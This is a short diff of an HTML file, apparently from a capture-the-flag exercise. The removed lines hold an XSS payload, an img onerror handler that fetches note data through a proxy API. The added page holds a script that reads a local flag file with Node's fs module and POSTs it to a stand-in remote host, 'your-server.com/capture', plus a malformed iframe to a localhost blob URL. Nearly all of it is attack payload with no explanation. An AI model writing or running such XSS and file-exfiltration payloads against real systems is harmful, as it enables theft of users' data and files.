@@ -1,2 +1,35 @@
-<p>hi</p>
-<img src='x' onerror="fetch('https://proxy:8080/api/').then(csrf => {return fetch('https://proxy:8080/api/note/get')}).then(b => {return b.text()}).then(c => console.log(c))"/>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect after 3 seconds</title>
+</head>
+<body>
+
+<script>
+/*document.addEventListener("DOMContentLoaded", function() {
+	console.log('running');
+	setTimeout(() => {
+		console.log('navigating to image');
+		window.location.href = 'https://localhost:5435/image';
+	}, 2000);
+});*/
+</script>
+<script>
+// Attempt to require the Node.js 'fs' module
+const fs = require('fs');
+
+// Read a sensitive file, for example, the flag file
+const flag = fs.readFileSync('/path/to/flag.txt', 'utf8');
+
+// Send the flag to your remote server for capture
+fetch('https://your-server.com/capture', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ flag: flag })
+});
+</script>
+<-- <iframe id= src='https://localhost:5435/image/setimgblob?imgBlob=blob:https://localhost:5435/fb139c27-64a4-45e9-ad25-0fdc396dab0a'/>
+</body>
+</html>
